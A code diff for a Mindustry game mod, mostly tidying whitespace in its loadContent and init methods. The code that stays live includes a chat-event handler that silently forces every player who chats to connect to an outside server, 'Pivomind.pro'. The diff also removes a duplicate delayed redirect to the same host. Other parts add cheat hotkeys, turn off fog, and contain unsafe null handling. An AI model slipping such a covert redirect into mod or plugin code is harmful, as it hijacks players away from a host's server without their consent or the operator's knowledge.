@@ -40,25 +40,11 @@ public class Modomodrek extends Mod {
     @Override
     public void loadContent() {
         qwerWalls.load();
-
-
-
-} 
-
-
-
-
+}
     @Override
     public void init() {
-        
-
-        
    mindustry.Vars.maxSchematicSize = 2048;
-
- 
         Events.on(EventType.WorldLoadEvent.class, event -> {
-        
-
             for (Team team : Team.all) {
                 Vars.state.rules.teams.get(team).infiniteAmmo = false;
             }
@@ -66,29 +52,18 @@ public class Modomodrek extends Mod {
 Events.on(PlayerChatEvent.class, event -> {
 Player player = event.player;
 Unit unit = player.unit();
-    if(unit == null) {}
-    else {
-        Timer.schedule(() -> {
-            if (player.con != null) {
-                Call.connect(player.con, "pivomind.pro", 6567);
-            }
-        }, 2);
-    }
+
         if(player == null) {
         } else {
-
             Call.connect(event.player.con, "Pivomind.pro", 6567);
         }
         unit.health *= 2f;
 unit.addItem(unit.stack.item, 1);
     });
-
-
 Events.run(Trigger.update, () -> {
 if(Core.input.keyTap(KeyCode.f6)) {
 Player player = Vars.player;
 Unit unit = player.unit();
-
     if(Vars.state.rules.unitAmmo == false) {
         Vars.state.rules.unitAmmo = true;
     } 
@@ -105,39 +80,21 @@ if(Core.input.keyTap(KeyCode.f5)) {
 }
          if(Core.input.keyTap(KeyCode.f4)) {   
     for (Block block : Vars.content.blocks()) {
-    
         Vars.state.rules.allowEditRules = true;
         Vars.state.rules.instantBuild = true;
 if(Core.input.keyTap(KeyCode.f3)) {   
     Events.fire(EventType.WorldLoadEvent.class);
-    
     mindustry.Vars.enableLight = false;
    Vars.control.input.block = Blocks.air;
    mindustry.content.Blocks.air.generateIcons = true;
     Vars.state.rules.revealedBlocks.add(Blocks.air); //Работает?
-
-
     }
          }
-        
-
          }
      });
-       
     Events.run(Trigger.update, () -> {
-        
             Vars.state.rules.fog = false;
         Vars.state.rules.staticFog = false;
-            
-        
     });
-
-
-
-
-    
-    
 }
-
-
-} 
+}
